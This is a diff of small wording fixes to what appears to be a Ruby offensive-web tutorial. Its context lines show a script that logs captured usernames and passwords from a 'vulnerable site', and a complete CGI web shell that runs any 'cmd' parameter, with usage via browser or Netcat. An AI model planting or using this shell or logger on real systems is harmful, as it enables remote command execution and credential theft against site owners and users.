@@ -232,7 +232,7 @@ File.open(file, "a") do |f|
   f.puts time   # Time of receiving the get request
   f.puts "#{URI.decode user}:#{URI.decode pass}"    # The data
   f.puts cgi.remote_addr    # Remote user IP
-  f.puts cgi.referer    # The vulnerable site url
+  f.puts cgi.referer    # The vulnerable site URL
   f.puts "---------------------------"
 end
 File.chmod(0200, file)  # To prevent public access to the log file
@@ -250,7 +250,7 @@ cgi = CGI.new
 puts cgi.header
 system(cgi['cmd'])
 ```
-Now you can simply use browser, netcat or WebShellConsole[^1] to execute your commands.
+Now you can simply use a web browser, Netcat or WebShellConsole[^1] to execute your commands.
 ex.
 **Browser**
 ```
@@ -266,7 +266,7 @@ run wsc
 ```
 ruby wsc.rb
 ```
-Add Shell url
+Add Shell URL
 ```
 Shell -> set http://host/cgi/shell.rb?cmd=
 ```
@@ -283,7 +283,7 @@ Since we're talking about dealing with web in ruby, we can't forget **Mechanize*
 More about Mechanize gem
 - [Getting Started With Mechanize][3]
 - [Mechanize examples][4]
-- [RailCasts | Mechanize tutorial][5]
+- [RailsCasts | Mechanize tutorial][5]
 
 Since you know the hard way, you'll find Mechanize as simple as mouse clicks! give it a try!
 
